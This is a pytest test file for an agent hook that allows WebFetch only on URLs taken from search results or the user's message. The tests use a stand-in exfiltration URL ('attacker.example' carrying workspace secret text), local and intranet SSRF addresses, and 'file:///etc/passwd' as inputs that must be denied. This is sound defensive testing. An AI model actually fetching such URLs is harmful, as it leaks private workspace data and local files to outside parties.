"""TD-39：`native` 模式下 Claude `WebFetch` 的「URL 来源」hook。"""

from __future__ import annotations

from collections.abc import Iterator
from typing import Any

import pytest
from claude_agent_sdk.types import HookContext

from studio.agent import url_source
from studio.agent.claude_web import fetch_denial_reason, web_fetch_hook, web_search_collect_hook

SESSION = "sess-web"
_CONTEXT: HookContext = {"signal": None}


@pytest.fixture(autouse=True)
def _clean_urls() -> Iterator[None]:
    url_source.reset_searched()
    yield
    url_source.reset_searched()


async def _pre(hook: Any, url: object) -> dict[str, Any]:
    data = {
        "session_id": "x",
        "transcript_path": "",
        "cwd": "",
        "hook_event_name": "PreToolUse",
        "tool_name": "WebFetch",
        "tool_input": {"url": url, "prompt": "总结"},
        "tool_use_id": "t1",
    }
    return dict(await hook(data, "t1", _CONTEXT))


async def _post(hook: Any, response: object) -> dict[str, Any]:
    data = {
        "session_id": "x",
        "transcript_path": "",
        "cwd": "",
        "hook_event_name": "PostToolUse",
        "tool_name": "WebSearch",
        "tool_input": {"query": "q"},
        "tool_response": response,
        "tool_use_id": "t1",
    }
    return dict(await hook(data, "t1", _CONTEXT))


class TestWebFetchHook:
    async def test_url_from_search_results_is_allowed(self) -> None:
        await _post(
            web_search_collect_hook(SESSION),
            {"query": "q", "results": [{"title": "A", "url": "https://example.com/a?x=1"}]},
        )

        output = await _pre(web_fetch_hook(None, SESSION), "https://example.com/a?x=1")

        assert "hookSpecificOutput" not in output

    async def test_urls_in_plain_text_response_are_collected(self) -> None:
        await _post(
            web_search_collect_hook(SESSION),
            "Links: [A](https://docs.example.org/guide/) and https://blog.example.net/post.",
        )

        assert url_source.searched_urls(SESSION) == {
            "https://docs.example.org/guide",
            "https://blog.example.net/post",
        }

    async def test_invented_url_is_denied(self) -> None:
        output = await _pre(
            web_fetch_hook(None, SESSION), "https://attacker.example/?d=SECRET-WORKSPACE-TEXT"
        )

        specific = output["hookSpecificOutput"]
        assert specific["permissionDecision"] == "deny"
        assert "搜索结果或用户消息" in specific["permissionDecisionReason"]

    async def test_other_sessions_results_do_not_count(self) -> None:
        await _post(web_search_collect_hook("other"), {"url": "https://example.com/a"})

        output = await _pre(web_fetch_hook(None, SESSION), "https://example.com/a")

        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"

    @pytest.mark.parametrize(
        "url",
        [
            "http://127.0.0.1:8000/api",
            "http://localhost/x",
            "http://intranet/x",
            "https://user:pw@example.com/x",
            "file:///etc/passwd",
            "",
            None,
        ],
    )
    async def test_unfetchable_addresses_denied_even_if_seen(self, url: object) -> None:
        if isinstance(url, str):
            url_source.record_searched(SESSION, [url])

        output = await _pre(web_fetch_hook(None, SESSION), url)

        assert output["hookSpecificOutput"]["permissionDecision"] == "deny"

    async def test_url_in_user_message_is_allowed(self, env: Any) -> None:
        from studio.db.repo.profiles import get_model_profile, seed_model_profiles
        from studio.db.repo.sessions import create_session
        from studio.db.repo.turns import create_turn_if_session_idle

        seed_model_profiles(env.engine, enable_fake_runtime=True)
        profile = get_model_profile(env.engine, "fake")
        assert profile is not None
        session = create_session(
            env.engine,
            project_id=env.project_id,
            stage="topic",
            model_profile_id=profile.id,
            runtime="fake",
        )
        create_turn_if_session_idle(env.engine, session.id, "参考 https://user.example.com/post。")

        allowed = fetch_denial_reason(env.engine, session.id, "https://user.example.com/post")
        denied = fetch_denial_reason(env.engine, session.id, "https://elsewhere.example.com/")

        assert allowed is None
        assert denied is not None

    async def test_collect_hook_without_session_is_noop(self) -> None:
        output = await _post(web_search_collect_hook(None), {"url": "https://example.com/a"})

        assert output == {}


class TestUrlSourceStore:
    def test_lru_keeps_recent_sessions(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(url_source, "MAX_TRACKED_SESSIONS", 2)
        url_source.record_searched("a", ["https://a.example.com/"])
        url_source.record_searched("b", ["https://b.example.com/"])
        url_source.record_searched("a", ["https://a2.example.com/"])  # a is now most recent
        url_source.record_searched("c", ["https://c.example.com/"])  # evicts b

        assert url_source.searched_urls("b") == set()
        assert url_source.searched_urls("a") == {
            "https://a.example.com",
            "https://a2.example.com",
        }
        assert url_source.searched_urls("c") == {"https://c.example.com"}
